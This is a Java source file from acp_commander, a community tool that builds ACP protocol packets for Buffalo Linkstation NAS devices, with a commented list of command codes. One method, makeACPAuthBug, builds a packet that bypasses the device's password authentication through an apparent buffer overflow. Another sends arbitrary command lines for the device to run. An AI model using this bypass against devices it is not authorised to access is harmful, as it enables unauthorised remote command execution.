package acpcommander;

/**
 * <p>Überschrift: acp_commander</p>
 *
 * <p>Beschreibung: Compiles ACP packets for the Buffalo Linkstation (R). Out of the work
 * of linkstationwiki.net</p>
 *
 * <p>Copyright: Copyright (c) 2006</p>
 *
 * <p>Organisation: linkstationwiki.net</p>
 *
 * @author Georg
 * @version 0.1
 */


/*----------------------------------------------------------------------------------------
 ACP-Commands
 Source: EricC @ linkstationwiki.net // ethereal sniff with clientServer_util in debug mode
 ------------------------------------------------------------------------------------------
 8020 ACP_Discover
 8030 ACP_Change_IP (Password protected)
 8040 ACP_Ping
 8050 ACP_Info (No Response generated)
 8070 ACP_FIRMUP_End
 8080 ACP_FIRMUP2
 8090 ACP_INFO_HDD
 80A0 ACP_Special
 ---- 01 SPECIAL_CMD_REBOOT (Enable via SPECIAL_CMD_EN_ONECMD)
 ---- 02 SPECIAL_CMD_SHUTDOWN (Enable via SPECIAL_CMD_EN_ONECMD)
 ---- 03 SPECIAL_CMD_EMMODE (Enable via SPECIAL_CMD_EN_ONECMD)
 ---- 04 SPECIAL_CMD_NORMMODE (Enable via SPECIAL_CMD_EN_ONECMD)
 ---- 05 SPECIAL_CMD_BLINKLED (Also plays a series of tones)
 ---- 06 SPECIAL_CMD_SAVECONFIG
 ---- 07 SPECIAL_CMD_LOADCONFIG
 ---- 08 SPECIAL_CMD_FACTORYSETUP (Sets DHCP, restores root password, etc)
 ---- 09 SPECIAL_CMD_LIBLOCKSTATE
 ---- 0a SPECIAL_CMD_LIBLOCK
 ---- 0b SPECIAL_CMD_LIBUNLOCK
 ---- 0c SPECIAL_CMD_AUTHENICATE (Password Protected)
 ---- 0d SPECIAL_CMD_EN_ONECMD (Enable is Password Protected)
 ---- 0e SPECIAL_CMD_DEBUGMODE
 ---- 0f SPECIAL_CMD_MAC_EEPROM (Enable via SPECIAL_CMD_EN_ONECMD)
 ---- 12 SPECIAL_CMD_MUULTILANG (Enable via SPECIAL_CMD_EN_ONECMD)
 80D0 ACP_PART
 80E0 ACP_INFO_RAID Returns Unsupported Command Error maybe due to no raid config?
 8A10 ACP_CMD
 8B10 ACP_FILE_SEND Password Protected Sent after 8080. TCP File transfer starts after reply
 8B20 ACP_FILESEND_END Sent after TCP file transfer
 ----------------------------------------------------------------------------------------*/

import acpcommander.ACPPacket;

public class ACPSendPacket extends ACPPacket {

    public void makeACPDiscover() {
        setCommand ("8020");
    }

    public void makeACPEnOneCmd(String passwordHex) {
        setACPSpecialCmd((byte) 0x0d); // ACP-EnOneCmd: specialCmd, 0x0D
    }

    public void makeACPAuth(String passwordHex) {
        setACPSpecialCmd((byte) 0x0c);
        System.arraycopy(HexToByte(passwordHex), 0, packetbuf, 40, 8); // the encrypted password as hexstring
    }

    public void makeACPAuthBug() {
        // sending a ACP_Auth packet with the command word set to 0x8a10 instead of 0x80a0
        // will disable authentication on the linkstation and allow sending ACP commands.
        // This works independent form the actually set password on the linkstation.
        // Reason is probably a buffer overflow in buffalos ClientServer_util on the
        // linkstation that handles the ACP stuff, there.
        makeACPAuth("14:bd:36:a7:a7:81:86:f1");
        setCommand("8a10");
    }

    public void makeACPCmd(String CmdLine) throws Exception {
        // length check for input param CmdLine
        if (CmdLine.length() > 210) {
            throw new Exception("ACPCommand: Commandline too long!");
        }

        setCommand("8a10", (byte) (CmdLine.length() + 12));
        packetbuf[32] = (byte) CmdLine.length();
        packetbuf[36] = (byte) 0x03; // type
        // TODO: what does the type field mean/cause?

        System.arraycopy(CmdLine.getBytes(), 0, packetbuf, 40, CmdLine.length());
    }


    public void setACPSpecialCmd(byte SpecialCmd) {
        setCommand("80a0");
        setSpecialCmd(SpecialCmd);
    }

    public void acpSendPacket() {
        // initialization shoud be done in acpPacket, via jbInit();
    }
}
